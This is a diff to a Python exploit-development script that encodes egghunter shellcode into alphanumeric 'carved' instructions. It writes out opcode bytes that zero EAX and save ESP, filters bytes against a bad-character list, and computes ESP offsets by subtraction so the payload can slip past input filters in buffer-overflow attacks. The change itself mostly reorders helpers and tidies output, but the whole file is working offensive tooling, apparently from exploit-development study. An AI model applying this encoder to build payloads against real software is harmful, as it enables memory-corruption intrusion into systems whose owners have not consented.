@@ -58,28 +58,7 @@ args = parser.parse_args()
 
 carveShellcode = ""
 
-def PrintGreen(text):
-    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
 
-def PrintBlue(text):
-    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
-
-def PrintRed(text):
-    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
-
-def find_str(s, char):
-    index = 0
-
-    if char in s:
-        c = char[0]
-        for ch in s:
-            if ch == c:
-                if s[index:index+len(char)] == char:
-                    return index
-
-            index += 1
-
-    return -1
     
 allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
           0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
@@ -111,19 +90,10 @@ alpha = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b,
          0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
          0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a]
          
-# badChars =[ 0x00, 0x0a, 0x0d, 0x0e, 0x2f, 0x3a, 0x3f, 0x40, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 
-            # 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 
-            # 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 
-            # 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 
-            # 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 
-            # 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 
-            # 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 
-            # 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 
-            # 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 
-            # 0xff
-           # ]
-           
-badChars =[ 0x00, 0x0a, 0x0d, 0x2f, 0x3a, 0x3f, 0x40, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 
+
+# Modify badChars as necessary
+# badChars = [ 0x00 ]         
+badChars = [ 0x00, 0x0a, 0x0d, 0x2f, 0x3a, 0x3f, 0x40, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 
            0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 
            0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 
            0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 
@@ -134,6 +104,29 @@ badChars =[ 0x00, 0x0a, 0x0d, 0x2f, 0x3a, 0x3f, 0x40, 0x80, 0x81, 0x82, 0x83, 0x
            0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff]
          
 availChars = []
+
+def PrintGreen(text):
+    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
+
+def PrintBlue(text):
+    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
+
+def PrintRed(text):
+    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
+
+def find_str(s, char):
+    index = 0
+
+    if char in s:
+        c = char[0]
+        for ch in s:
+            if ch == c:
+                if s[index:index+len(char)] == char:
+                    return index
+
+            index += 1
+
+    return -1
     
 def carveEncode(x):
 
@@ -180,9 +173,7 @@ def carveEncode(x):
         except Exception as e:
             b4=c4=d4=""
             break
-    
-    #print ("Row 4: " + str(hex(a4)) + " " + str(b4) + " " + str(c4) + " " + str(d4))
-            
+                
     while row3 != row3Loop:
         try:
         
@@ -194,10 +185,7 @@ def carveEncode(x):
                 break
         except:
             b3=c3=d3=""
-            break   
-
-    #print ("Row 3: " + str(hex(a3)) + " " + str(b3) + " " + str(c3) + " " + str(d3))
-            
+            break               
     
     while row2 != row2Loop:
         try:
@@ -211,9 +199,7 @@ def carveEncode(x):
         except:
             b2=c2=d2=""
             break    
-    
-    #print ("Row 2: " + str(hex(a2)) + " " + str(b2) + " " + str(c2) + " " + str(d2))
-    
+        
     while row1 != row1Loop:
         try:
         
@@ -343,15 +329,20 @@ def main():
         s.close()
         
     elif (args.subparser == "carve"):
+    
+        startEsp = args.curr_esp
+        destEsp = args.dest_esp
+        print (PrintBlue("[i]") + " ESP start of carved code: \t\t{}".format(PrintGreen(startEsp.upper())))
+        print (PrintBlue("[i]") + " Code carved to ESP address: \t{}".format(PrintGreen(destEsp.upper())))
+        
         a = args.egghunter.replace("\\x","")
+        scStringLength = str(int(len(args.egghunter) / 4))
+        print (PrintBlue("[i]") + " Carving {} bytes of Shellcode".format(PrintGreen(scStringLength)))
                
         for x in allChar:
             if x not in badChars:
                 
-                availChars.append(hex(x))
-        
-        print (availChars)
-        
+                availChars.append(hex(x))       
         # Zero EAX
         carveShellcode = (("\\x25\\x4a\\x4d\\x4e\\x55"))
         carveShellcode += ("\\x25\\x35\\x32\\x31\\x2a")
@@ -359,22 +350,15 @@ def main():
         # Save ESP into EAX
         carveShellcode += ("\\x54\\x58")
         
-        startEsp = args.curr_esp
-        destEsp = args.dest_esp
-        
         if args.curr_esp and args.dest_esp:
             # SUB EAX to set ESP to necessary underflow 
             # SUB EAX
             # SUB EAX
             # SUB EAX
             # PUSH EAX, POP ESP
-            x  = hex((int(destEsp,16) - int(startEsp,16)))[3:]
-            print (x)
-            diff_esp = int("FFFFFFFF",16) - int(x,16) + int("1",16)
+            x  = hex((int(destEsp,16) - int(startEsp,16))).replace("0x","")
+            diff_esp = int("FFFFFFFF",16) - int(x,16)
             carveEncode(str(hex(diff_esp)[2:]))
-            #carveShellcode += "\\x2d\\x66\\x4d\\x55\\x55"
-            #carveShellcode += "\\x2d\\x66\\x4b\\x55\\x55"
-            #carveShellcode += "\\x2d\\x6a\\x50\\x55\\x55"
         
         else:
             print ("CALCULATE ESP ALIGNMENT MANUALLY")
@@ -398,8 +382,8 @@ def main():
             # PUSH EAX, POP ESP
             carveShellcode += ("\\x50")  
             
-        print ("[i] Carved Shellcode Size: {} bytes".format(int(len(carveShellcode) / 4)))
-        print (carveShellcode)
+        print (PrintGreen("[+]") + " Carved Shellcode Size: {} bytes:\n".format(PrintRed(str(int(len(carveShellcode) / 4)))))
+        print ("carvedShell = \"" + carveShellcode + "\"")
 
 if __name__ == "__main__":
     main()
